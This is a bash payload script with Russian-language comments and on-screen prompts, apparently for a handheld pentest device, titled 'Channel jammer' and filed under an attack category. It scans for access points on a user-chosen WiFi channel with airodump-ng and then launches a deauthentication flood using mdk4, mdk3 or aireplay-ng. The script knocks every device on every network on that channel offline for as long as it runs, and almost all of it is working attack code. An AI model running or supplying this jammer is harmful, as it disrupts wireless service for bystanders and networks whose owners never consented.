#!/bin/bash
# Название: Подавитель канала
# Автор: bad-antics  
# Описание: Подавление определённого WiFi-канала флудом деаутентификации
# Категория: nullsec/attack

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# В случае отсутствия подходящего интерфейса показывает диалог с ошибкой.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "ПОДАВИТЕЛЬ КАНАЛА

Нарушение всей активности WiFi
на определённом канале.

Деаутентифицирует ВСЕ устройства
из ВСЕХ сетей на целевом
канале.

Нажмите ОК для настройки."

PROMPT "ВЫБЕРИТЕ КАНАЛ:

Распространённые каналы:
1, 6, 11 (2.4 ГГц)

5 ГГц: 36, 40, 44, 48
       149, 153, 157, 161

Введите канал далее."

CHANNEL=$(NUMBER_PICKER "Целевой канал:" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac

DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ПОДАВЛЕНИЕ?

Канал: $CHANNEL
Длительность: ${DURATION} с

⚠️ Это отключит ВСЕХ
пользователей на канале $CHANNEL

Нажмите ОК для подавления.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Подавление канала $CHANNEL..."

# Фиксация на канале
iwconfig $IFACE channel $CHANNEL

# Поиск всех ТД на канале
SPINNER_START "Поиск целей..."
timeout 5 airodump-ng $IFACE -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
SPINNER_STOP

# Извлечение BSSID
grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/chanfind*.csv 2>/dev/null | sort -u > /tmp/jam_targets.txt

TARGET_COUNT=$(wc -l < /tmp/jam_targets.txt 2>/dev/null || echo 0)

LOG "Найдено ТД: $TARGET_COUNT"

# Запуск флуда деаутентификации на все цели
if command -v mdk4 >/dev/null 2>&1; then
    mdk4 $IFACE d -c $CHANNEL &
    JAM_PID=$!
elif command -v mdk3 >/dev/null 2>&1; then
    mdk3 $IFACE d -c $CHANNEL &
    JAM_PID=$!
else
    # Запасной вариант с aireplay
    while read BSSID; do
        aireplay-ng -0 0 -a "$BSSID" $IFACE 2>/dev/null &
    done < /tmp/jam_targets.txt
fi

PROMPT "ПОДАВЛЕНИЕ АКТИВНО

Канал: $CHANNEL
Целей: $TARGET_COUNT ТД

Нажмите ОК для ОСТАНОВКИ."

# Остановка всего
killall mdk4 mdk3 aireplay-ng 2>/dev/null
kill $JAM_PID 2>/dev/null

PROMPT "ПОДАВЛЕНИЕ ОСТАНОВЛЕНО

Канал: $CHANNEL
Длительность: Активно до остановки

Нажмите ОК для выхода."